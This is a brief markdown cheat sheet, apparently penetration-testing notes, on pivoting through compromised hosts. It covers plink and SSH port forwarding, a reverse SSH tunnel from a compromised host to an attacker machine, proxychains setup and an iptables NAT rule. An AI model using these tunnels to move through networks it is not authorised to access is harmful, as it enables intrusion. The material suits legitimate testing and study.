### <--- Pivoting ---> ###

#### Plink Remote Port Forwarding ####

```plink -l $user -pw $password $attacking_machine_ip -R $attacker_port_to_open:127.0.0.1:$victim_port```

```plink.exe -R "remote port":127.0.0.1:"local port" root@"ipaddress"```

```$command 127.0.0.1:$attacker_port```

#### SSH Remote Port Forwarding ####

```ssh user@target_ip -R $remote_port:127.0.0.1:$local_port```

#### SSH Local Port Forwarding ###

```ssh user@target_ip -L $initiating_ip:$initiating_port:$target_ip:$target_port```

#### SSH Dynamic Port Forwarding ###

##### Create a Local SOCKS4 Proxy ####

*Example: ssh -D 8080 root@pwned.com*

```ssh -D $local_proxy_port -p $remote_port $target```

#### Using Proxychains ####

##### Create a reverse SSH tunnel to attacker from compromised host #####

```ssh -f -N -R 2222:127.0.0.1:22 root@kali```

#####  Create a dynamic application-level port forward on port 8080 on attacking machine #####

```ssh -f -N -D 127.0.0.1:8080 -p 2222 user@local```

##### Set proxychains  #####

```nano /etc/proxychains.conf```

```socks4 127.0.0.1 8080```

#### IPTables ####

*NOTE: https://www.andreafortuna.org/2019/05/08/iptables-a-simple-cheatsheet/*

```iptables -t nat -A PREROUTING -p tcp -d 1.2.3.4 --dport 422 -j DNAT --to 192.168.0.100:22```
